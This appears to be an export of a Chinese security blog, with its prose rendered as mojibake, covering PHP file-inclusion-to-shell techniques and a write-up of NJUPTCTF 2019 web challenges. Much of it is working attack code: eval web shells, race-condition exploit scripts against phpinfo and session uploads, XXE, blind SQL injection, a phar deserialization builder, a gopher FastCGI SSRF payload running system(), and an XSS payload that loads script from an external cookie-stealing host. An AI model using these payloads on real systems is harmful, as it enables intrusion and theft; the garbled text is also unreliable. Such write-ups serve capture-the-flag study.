ä¸ºæ–¹ä¾¿ç­‰é—®é¢˜å¯¼è‡´æƒé™é…ç½®é”™è¯¯ã€‚ ğŸ§ apache log getshellé€šè¿‡å‘åŒ…æˆ–è€…nc è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨ncå»è®¿é—®ï¼Œä¸ç”¨http://xxxxxx/&lt;?php &gt;è¿™æ ·çš„æ–¹å¼å»è®¿é—®ï¼Œå› ä¸ºæ—¥å¿—åœ¨å­˜å‚¨çš„è¿‡ç¨‹ä¸­ä¼šæŠŠç¬¦å·è½¬æ¢æˆç¼–ç çš„å½¢å¼ï¼Œç„¶åå°±æ— æ³•äº§ç”Ÿä¸€å¥è¯äº†ã€‚ webæ—¥å¿—å¸¸è§çš„è·¯å¾„ 1234567&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;acces_log&#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_log&#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log&#x2F;var&#x2F;log&#x2F;apache&#x2F;error.log ä¸ºäº†æ–¹ä¾¿ï¼Œå…ˆæŠŠä¹‹å‰çš„access.logåˆ é™¤ï¼Œåœ¨é‡å¯ä¸‹apache ä»¥æˆ‘ubuntu 18.04ä¸ºä¾‹ï¼Œå°è¯• 1&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; æŸ¥çœ‹æ—¥å¿— å°è¯•lfi.phpä¸­åŒ…å«ï¼Œå‘ç°å¤±è´¥ï¼Œ æœç„¶æ²¡æœ‰è¯»å–æƒé™ã€‚ã€‚ã€‚ã€‚ æˆ‘æŠŠè¿™ä¸ªæ–‡ä»¶å†…å®¹æ”¾åˆ°èƒ½è¢«åŒ…å«åˆ°çš„åœ°æ–¹ï¼Œèƒ½æˆåŠŸgetshell æˆ–è€…ä¿®æ”¹æƒé™ğŸ˜‹ æ‰€ä»¥ä»¥åå°è¯•ä¹‹å‰å…ˆåŒ…å«ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœèƒ½åŒ…å«ï¼Œèƒ½å¤Ÿçœ‹åˆ°æ–‡ä»¶å†…å®¹ï¼Œè¿™æ„å‘³ç€ä½ å¯¹è¿™ä¸ªæ–‡ä»¶å…·æœ‰è¯»å†™æƒé™ ï¼Œé‚£ä¹ˆå·²ç»æˆåŠŸäº†å¤§åŠ /proc/self/environ å‚è€ƒé“¾æ¥ï¼šhttps://yq.aliyun.com/articles/441861 æˆ‘çš„ubuntu 18.04çš„é»˜è®¤æƒé™ğŸ˜… é‚£ä¹ˆä¹Ÿæš‚æ—¶ä¸å¤ç°äº†ã€‚ã€‚å·æ‡’ /var/log/mail å‚è€ƒé“¾æ¥ï¼šhttps://xz.aliyun.com/t/3799#toc-15 1netstat -tlpn å‘ç°è‡ªå·±æœªå¼€å¯smtpæœåŠ¡ï¼Œé‚£ä¹ˆä¹Ÿä¸å¤ç°äº† æ€è·¯ä¸éš¾ï¼Œå’Œä¹‹å‰çš„ç±»ä¼¼ï¼ŒSMTPæ—¥å¿—æŠ•æ¯’ï¼Œä¹‹å‰åšè¿‡ä¸€é¢˜ssrf+gopher ç±»ä¼¼çš„è¿˜æœ‰ä¸‹é¢çš„ 123&#x2F;proc&#x2F;self&#x2F;fd&#x2F;var&#x2F;log&#x2F;vsftpd.log&#x2F;var&#x2F;log&#x2F;sshd.log ä¸‹é¢çš„éƒ½å¯ä»¥é€šè¿‡phpinfo()æ¥è·å–è·¯å¾„ï¼Œæˆ–è€…é çˆ†ç ´ åˆ©ç”¨PHPä¼šè¯å€¼æ‰§è¡ŒRCEä½¿ç”¨æ§åˆ¶ å‚è€ƒé“¾æ¥ï¼š https://www.4hou.com/vulnerable/7774.html å…¶å®è¯´èµ·æ¥ä¹‹å‰åšé¢˜åˆ©ç”¨è¿‡sessionï¼Œå½“æ—¶æ˜¯åˆ©ç”¨åºåˆ—åŒ–çš„å¼•æ“å’Œååºåˆ—åŒ–çš„å¼•æ“ä¸ä¸€è‡´æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨å¼•æ“ä¹‹é—´çš„å·®å¼‚äº§ç”Ÿåºåˆ—åŒ–æ³¨å…¥æ¼æ´ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å†™å…¥shellå³å¯ å­˜åœ¨ä¸€ä¸ªLFIæ—¶ï¼Œå¹¶ä¸”å¼€å¯äº†session phpä¿å­˜æ ¼å¼sess_SESSIONID å½“ç„¶phpinfo()ä¹Ÿå¯ä»¥çœ‹ é»˜è®¤ä½ç½®æ˜¯ /tmp/(PHP Sessions) /var/lib/php/session/(PHP Sessions) /var/lib/php5/(PHP Sessions) å› ä¸ºå¯èƒ½é€šå¸¸è¿™ä¸¤ç‚¹ä¸åœ¨åŒä¸€ä¸ªæ–‡ä»¶ï¼Œç‰¹æ„åˆ†ä¸¤ä¸ªæ–‡ä»¶ 1.php 123&lt;?php include($_POST[&#39;file&#39;]);?&gt; 2.php 1234&lt;?php session_start(); echo $_COOKIE[&#39;user&#39;]; $_SESSION[&#39;name&#39;] &#x3D; $_COOKIE[&#39;user&#39;]; é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ„é€  1Cookie:user&#x3D;%3C%3Fphp+system%28%22dir%22%29%3B%3F%3E æ³¨æ„è¿™é‡Œè¦urlç¼–ç ï¼Œä¹‹åä¼šè‡ªåŠ¨urlè§£ç ä¸€æ¬¡ï¼Œå¦åˆ™åˆ†å·ä½œä¸ºä¼ é€’å‚æ•°çš„åˆ†éš”ç¬¦ sessionè¿˜æœ‰å¦ä¸€ä¸ªæ›´åŠ é€šç”¨çš„æ€è·¯ session+LFI getshellsession.upload_progress å®˜æ–¹æ–‡æ¡£ï¼šhttps://www.php.net/manual/zh/session.upload-progress.php å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾— æ”»å‡»æµç¨‹ 1ã€æ„é€ ä¸Šä¼ è¡¨å•ï¼Œå‚è€ƒé“¾æ¥ 123456&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt; é»˜è®¤é…ç½®å¦‚ä¸‹ï¼Œ session.upload_progress.cleanupå¼€å¯ï¼Œè¯»å–å®Œpostå†…å®¹æ—¶,sessionå†…å®¹å°±ä¼šæ¸…ç©º,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰,ä¸€ç›´å‘é€è¯·æ±‚,ç„¶åä¸€ç›´åŒ…å«ã€‚ 2ã€bpæˆ–è€…è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰ ä¸Šä¼ åŒ… è¯·æ±‚åŒ… è¯·æ±‚åŒ…å«æˆ‘è®¾ç½®5000æ¬¡,ä¸Šä¼ æˆ‘è®¾ç½®1000æ¬¡(è¿™æ ·å¯ä»¥ä¸€è¾¹æŒç»­è¯·æ±‚,ç„¶åä¸€è¾¹ç”Ÿæˆ) ç”¨@wonderkunå¸ˆå‚…çš„ä¸€ä¸ªè„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536#!coding:utf-8import requestsimport timeimport threadinghost &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;PHPSESSID &#x3D; &#39;ssssssss&#39;def creatSession(): while True: files &#x3D; &#123; &quot;upload&quot; : (&quot;tmp.jpg&quot;, open(&quot;a.txt&quot;, &quot;rb&quot;)) &#125; data &#x3D; &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : &quot;&lt;?php echo md5(&#39;1&#39;);?&gt;&quot; &#125; headers &#x3D; &#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;&#39; + PHPSESSID&#125; r &#x3D; requests.post(host+&#39;1.php&#39;,files &#x3D; files,headers &#x3D; headers,data&#x3D;data) # print r.content.decode(&#39;utf-8&#39;)fileName &#x3D; r&quot;E:\\Program Files\\phpstudy_pro\\Extensions\\tmp\\tmp\\sess_&quot;+PHPSESSIDprint fileNameif __name__ &#x3D;&#x3D; &#39;__main__&#39;: url &#x3D; &quot;&#123;&#125;&#x2F;1.php?file&#x3D;&#123;&#125;&quot;.format(host,fileName) headers &#x3D; &#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;&#39; + PHPSESSID&#125; t &#x3D; threading.Thread(target&#x3D;creatSession,args&#x3D;()) t.setDaemon(True) t.start() while True: res &#x3D; requests.post(url,data&#x3D;&#123;&#39;file&#39;:fileName&#125;,headers&#x3D;headers) if &quot;c4ca4238a0b923820dcc509a6f75849b&quot; in res.content: print(&quot;[*] Get shell success.&quot;) break else: print(&quot;[-] retry.&quot;) phpinfo-LFI åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell æˆ‘ä»¬æ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•çš„æ—¶å€™,phpä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„ä¸´æ—¶æ–‡ä»¶,è¿™ä¸ªæ–‡ä»¶çš„ç›¸å…³å†…å®¹å¯ä»¥åœ¨phpinfo()çš„_FILE[&quot;file&quot;]æŸ¥çœ‹åˆ°,ä½†æ˜¯ä¸´æ—¶æ–‡ä»¶å¾ˆå¿«å°±ä¼šè¢«åˆ é™¤,æ‰€ä»¥æˆ‘ä»¬èµ¶åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰,åŒ…å«ä¸´æ—¶æ–‡ä»¶å°±å¯ä»¥getshelläº†ã€‚ æ ¹æ®phpinfo()ä¸­çš„upload_tmp_dir ç›´æ¥ä¸Šè„šæœ¬ï¼Œå‚è€ƒé“¾æ¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196#!&#x2F;usr&#x2F;bin&#x2F;python# coding&#x3D;utf-8import sysimport threadingimport socketimport urllibdef setup(host, port): TAG&#x3D;&quot;Security Test&quot; PAYLOAD&#x3D;&quot;&quot;&quot;%s\\r&lt;?php $c&#x3D;fopen(&#39;&#x2F;tmp&#x2F;g&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;\\r&quot;&quot;&quot; % TAG REQ1_DATA&#x3D;&quot;&quot;&quot;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name&#x3D;&quot;dummyname&quot;; filename&#x3D;&quot;test.txt&quot;\\rContent-Type: text&#x2F;plain\\r\\r%s-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot; % PAYLOAD padding&#x3D;&quot;A&quot; * 5000 # è¿™é‡Œéœ€è¦ä¿®æ”¹ä¸ºphpinfo.phpçš„åœ°å€ REQ1&#x3D;&quot;&quot;&quot;POST &#x2F;phpinfo.php?a&#x3D;&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP&#x2F;1.1\\rCookie: PHPSESSID&#x3D;q249llvfromc1or39t6tvnun42; othercookie&#x3D;&quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rContent-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ&#x3D;&quot;&quot;&quot;GET &#x2F;lfi.php?file&#x3D;%s HTTP&#x2F;1.1\\rUser-Agent: Mozilla&#x2F;4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r&quot;&quot;&quot; return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d &#x3D; &quot;&quot; while len(d) &lt; offset: d +&#x3D; s.recv(offset) try: i &#x3D; d.find(&quot;[tmp_name] &#x3D;&gt; &quot;) fn &#x3D; urllib.quote(d[i+17:i+31]) # print fn except ValueError: return None s2.send(lfireq % (fn, host)) print lfireq % (fn, host) #debugè°ƒè¯•ç»“æœ d &#x3D; s2.recv(4096) # print d #æŸ¥çœ‹å›æ˜¾æ˜¯å¦æˆåŠŸ s.close() s2.close() if d.find(tag) !&#x3D; -1: return fncounter&#x3D;0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event &#x3D; e self.lock &#x3D; l self.maxattempts &#x3D; m self.args &#x3D; args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;&#x3D; self.maxattempts: return counter+&#x3D;1 try: x &#x3D; phpInfoLFI(*self.args) if self.event.is_set(): break if x: print &quot;\\nGot it! Shell created in &#x2F;tmp&#x2F;g&quot; self.event.set() except socket.error: returndef getOffset(host, port, phpinforeq): &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot; s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d &#x3D; &quot;&quot; while True: i &#x3D; s.recv(4096) d+&#x3D;i if i &#x3D;&#x3D; &quot;&quot;: break # detect the final chunk if i.endswith(&quot;0\\r\\n\\r\\n&quot;): break s.close() i &#x3D; d.find(&quot;[tmp_name] &#x3D;&gt; &quot;) if i &#x3D;&#x3D; -1: raise ValueError(&quot;No php tmp_name in phpinfo output&quot;) print &quot;found %s at %i&quot; % (d[i:i+10],i) # padded up a bit return i+256def main(): print &quot;LFI With PHPInfo()&quot; print &quot;-&#x3D;&quot; * 30 if len(sys.argv) &lt; 2: print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0] sys.exit(1) try: host &#x3D; socket.gethostbyname(sys.argv[1]) except socket.error, e: print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e) sys.exit(1) port&#x3D;80 try: port &#x3D; int(sys.argv[2]) except IndexError: pass except ValueError, e: print &quot;Error with port %d: %s&quot; % (sys.argv[2], e) sys.exit(1) poolsz&#x3D;10 try: poolsz &#x3D; int(sys.argv[3]) except IndexError: pass except ValueError, e: print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e) sys.exit(1) print &quot;Getting initial offset...&quot;, reqphp, tag, reqlfi &#x3D; setup(host, port) offset &#x3D; getOffset(host, port, reqphp) sys.stdout.flush() maxattempts &#x3D; 1000 e &#x3D; threading.Event() l &#x3D; threading.Lock() print &quot;Spawning worker pool (%d)...&quot; % poolsz sys.stdout.flush() tp &#x3D; [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( &quot;\\r% 4d &#x2F; % 4d&quot; % (counter, maxattempts)) sys.stdout.flush() if counter &gt;&#x3D; maxattempts: break print if e.is_set(): print &quot;Woot! \\m&#x2F;&quot; else: print &quot;:(&quot; except KeyboardInterrupt: print &quot;\\nTelling threads to shutdown...&quot; e.set() print &quot;Shuttin&#39; down...&quot; for t in tp: t.join()if __name__&#x3D;&#x3D;&quot;__main__&quot;: main() æ ¹æ®æ³¨é‡Šä¿®æ”¹ä¸€ä¸‹å³å¯ 1python 2.py 59.110.164.44 80 100 LFI + php7å´©æºƒ å¦‚æœæ²¡æœ‰phpinfo()è·å–tmpæ–‡ä»¶åçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨php7ç‰¹æœ‰çš„ä¸€ä¸ªå°ç‰¹æ€§ 1http:&#x2F;&#x2F;ip&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x3D;&#x2F;etc&#x2F;passwd è¿™æ ·ä¼šå¯¼è‡´phpåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°segment faulté”™è¯¯ï¼Œè¿™æ ·å¦‚æœå†æ­¤åŒæ—¶ä¸Šä¼ æ–‡ä»¶é‚£ä¹ˆä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«çˆ†å­˜åœ¨/tmpç›®å½•ä¸‹ï¼Œä¸ä¼šè¢«åˆ é™¤ã€‚ å…¶å®é“ç†å¾ˆç®€å•ï¼Œå°±æ˜¯è¿™ä¸ªé¢˜ç›®è¿˜ç»™ä½ æä¾›äº†ä¸€ä¸ªåˆ—ç›®å½•çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬ç”Ÿæˆtmpæ–‡ä»¶ï¼Œç„¶ååˆ—ç›®å½•è·å–æ–‡ä»¶åå°±å¥½äº† å¼•ç”¨ä¸€å¶é£˜é›¶å¸ˆå‚…çš„è„šæœ¬ 12345678910111213141516171819import requestsfrom io import BytesIOimport refiles &#x3D; &#123; &#39;file&#39;: BytesIO(&#39;&lt;?php eval($_REQUEST[sky]);&#39;)&#125;url &#x3D; &#39;http:&#x2F;&#x2F;192.168.6.99&#x2F;lfi.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&#39;try: r &#x3D; requests.post(url&#x3D;url, files&#x3D;files, allow_redirects&#x3D;False)except: url &#x3D; &#39;http:&#x2F;&#x2F;192.168.6.99&#x2F;dir.php&#39; r &#x3D; requests.get(url) data &#x3D; re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0) url &#x3D; &quot;http:&#x2F;&#x2F;192.168.6.99&#x2F;lfi.php?file&#x3D;&#x2F;tmp&#x2F;&quot;+data data &#x3D; &#123; &#39;sky&#39;:&quot;phpinfo();&quot; &#125; r &#x3D; requests.post(url&#x3D;url,data&#x3D;data) print r.content å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/5535","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"NJUPTCTF-wp","slug":"NJUPTCTF-wp","date":"2019-11-23T02:31:54.000Z","updated":"2020-04-10T13:38:56.292Z","comments":true,"path":"2019/11/23/NJUPTCTF-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/23/NJUPTCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• Fake XML cookbook True XML cookbook SQLi easyphp replace simple_xss phar matches everything flask_website Fake XML cookbookæç¤ºflagåœ¨/flag 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; True XML cookbookæŸ¥çœ‹æºç å‘ç°å’Œä¸Šä¸€é¢˜æ˜¯ä¸€æ ·çš„ æŸ¥çœ‹/etc/passwd /etc/hosts å‘ç°å­˜åœ¨å†…ç½‘ LinuxæŸ¥çœ‹MACåœ°å€æ–¹æ³• /proc/net/arp å†åˆ©ç”¨ssrfé€ä¸€æ¢æµ‹ SQLiå•å¼•å·å¯ä»¥ä½¿ç”¨\\æ¥è½¬ä¹‰ï¼Œorå¯ä»¥é‡‡ç”¨||ï¼Œæœ€åçš„å•å¼•å·å¯ä»¥ç”¨;%00æ¥æ³¨é‡Š æˆåŠŸç™»å½•ï¼Œä½†æ˜¯æ²¡æœ‰flag åˆ©ç”¨regexpæ¥æ­£åˆ™åŒ¹é… å†™ä¸ªè„šæœ¬ï¼Œç¼ºç‚¹æ˜¯æ— æ³•åŒ¹é…å¤§å°å†™ï¼Œè¿˜å¥½å‡ºé¢˜äººç»™æˆ‘ä»¬è¿‡äº†ğŸ˜ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-# @Time : 2019&#x2F;11&#x2F;23 11:02# @Author : glotozz# @File : 3.py.pyimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;nctf2019.x1ct34m.com:40005&#x2F;index.php&quot;headers &#x3D; &#123; &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0&#39;&#125;def change(b): res1 &#x3D; &quot;&quot; for i in b: res1 +&#x3D; hex(ord(i)) res1 &#x3D; res1.replace(&quot;0x&quot;, &quot;&quot;) res1 &#x3D; &quot;0x&quot; + res1 print(res1) return res1easy_strings &#x3D; [ord(i) for i in &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#39;]tmp &#x3D; 0flag &#x3D; &#39;^&#39;for i in range(1, 100): if tmp &#x3D;&#x3D; 1: break tmp &#x3D; 1 for j in easy_strings: # payload &#x3D; change(chr(j)) # å½“æ—¶å‚»äº†ï¼Œå†™äº†ä¸ªè„šæœ¬æ‰¾å‡ºç¬¬ä¸€ä¸ªå­—ç¬¦çš„æ‰€æœ‰å¯èƒ½æ€§ï¼Œå†éå†å‡ºæœ€å¤§é•¿åº¦ã€‚ç›´æ¥ç”¨^åŒ¹é…å¼€å¤´ payload &#x3D; change(flag + chr(j)) param &#x3D; &quot;&#x2F;**&#x2F;||passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&#123;&#125;;&#123;&#125;&quot;.format(payload, chr(0)) print(param) data &#x3D; &#123; &#39;username&#39;: &#39;\\\\&#39;, &#39;passwd&#39;: param &#125; r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, data&#x3D;data) # print(r.status_code) # print r.content.decode(&#39;utf-8&#39;) if &quot;go back to get the password&quot; in r.content.decode(&quot;utf-8&quot;): print j flag &#x3D; flag + chr(j) tmp &#x3D; 0 breakprint(flag) easyphpæœ¬æ¥å¯ä»¥ç«‹é©¬åšå‡ºæ¥çš„ï¼Œè¢«è‡ªå·±è ¢å“­äº† åˆ©ç”¨%0aç»•è¿‡ï¼Œ $ä¼šåŒ¹é…%0a strtr()æ˜¯ä¸€å¯¹ä¸€æ›¿æ¢ è¿™é‡Œæ˜¯å¡äº†æœ€ä¹…çš„ï¼ˆè¢«è‡ªå·±è ¢åˆ°äº†ï¼‰ï¼Œåˆ©ç”¨æ•°å­—çˆ†ç ´0eåé¢å…¨æ˜¯æ•°å­—æ˜¯çˆ†ä¸å‡ºæ¥çš„ï¼Œåˆšå¥½è¿™é‡Œæœ‰ä¸€æ¬¡æ›¿æ¢ï¼Œé‚£ä¹ˆçˆ†ç ´ä¸€ä¸ª0eåé¢åªå­˜åœ¨ä¸€ä¸ªcå­—æ¯çš„ï¼Œå†™ä¸ªè„šæœ¬ æˆ‘ä¹‹å‰åšè¿‡ç±»ä¼¼çš„é¢˜ï¼š https://glotozz.github.io/2019/08/16/%E5%87%A0%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/ 1234567891011121314str1 &#x3D; &#39;abdef&#39;for i in range(0, 99999999): flag &#x3D; 0 tmp &#x3D; md5(str(i)) if tmp[0:2] &#x3D;&#x3D; &#39;0e&#39;: # print tmp for j in tmp[2:]: # ä¸€å¼€å§‹è¿™é‡Œç”¨äº†tmp[0:],å¯¼è‡´ç¬¬äºŒä¸ªeä¸€ç›´è¢«åŒ¹é…åˆ°ã€‚ã€‚ã€‚ã€‚ if j in str1: flag &#x3D; 1 break if flag &#x3D;&#x3D; 0: print i break å˜é‡åä¸­çš„ç‚¹å’Œç©ºæ ¼è¢«è½¬æ¢æˆä¸‹åˆ’çº¿ã€‚ ç„¶åæ˜¯å‘½ä»¤æ‰§è¡Œ 12l$&#123;x&#125;stac f* paylaod 1http:&#x2F;&#x2F;nctf2019.x1ct34m.com:60005&#x2F;?num&#x3D;23333%0A&amp;str1&#x3D;2120624&amp;str2&#x3D;s214587387a&amp;q.w.q&#x3D;tac%20f* replaceå­—ç¬¦ä¸²æ›¿æ¢ï¼ŒçŒœæµ‹æ˜¯/eçš„ä»£ç æ‰§è¡Œï¼Œæµ‹è¯•ä¹‹åå‘ç°æºç ä¸­å·²ç»å­˜åœ¨/e å‘ç°å•å¼•å·è¢«è¿‡æ»¤ï¼Œä½¿ç”¨chr()ç»•è¿‡å³å¯ å·®ç‚¹åˆå»getcwd()ä»€ä¹ˆçš„äº†ï¼Œè¿˜å¥½ç¿”å“¥åŠæ—¶åˆ¶æ­¢ğŸ˜… simple_xssè¿ç»­å¥½å‡ æ¬¡xssæ²¡åšå‡ºæ¥ï¼Œå¥½åƒæ˜¯xsså¹³å°çš„åŸå› ï¼Œæ¢äº†ä¸ªå¹³å°æ”¶åˆ°äº† paylaod 1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;xss.pt&#x2F;U3Ni&quot;&gt;&lt;&#x2F;script&gt; è¿™ç§æƒ…å†µä¸è¡Œ è¿™ç§æƒ…å†µokkï¼Œä½†æ˜¯å…·ä½“å•¥åŸå› å¯èƒ½å’Œé¢˜ç›®ç¯å¢ƒæœ‰å…³æŠŠï¼Œæˆ‘å¥½åƒå°±åˆ·æ–°äº†å‡ æ¬¡ æ›¿æ¢cookie phar matches everythingåŠ æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€ç»•è¿‡ 12345678910111213141516&lt;?php class Main &#123; public $url &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub $o &#x3D; new Main(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; å†æŠŠåç¼€ä¿®æ”¹ä¸ºgifå³å¯ æ„é€  123http:&#x2F;&#x2F;nctf2019.x1ct34m.com:40004&#x2F;catchmime.php?careful&#x3D;O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7DPOST:name&#x3D;phar:&#x2F;&#x2F;uploads&#x2F;e05c977c3d.gif&amp;submit&#x3D; è¯»å–/flagå‘ç°ä¸å­˜åœ¨ï¼Œemmmå¡äº†å¥½ä¹…ï¼Œç¿”å“¥å†æ¬¡æŒ‡ç‚¹è¿·æ´¥ğŸ˜ï¼Œå†…ç½‘ï¼Œæç¤ºæˆ‘ä»¬they are very close åˆ†åˆ«æŸ¥çœ‹/etc/hosts /proc/net/arp å¼€å§‹SSRF http://10.0.0.2 å‘ç°æ˜¯å½“å‰å†…ç½‘åœ°å€ http://10.0.0.3 1gopher:&#x2F;&#x2F;10.0.0.3:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 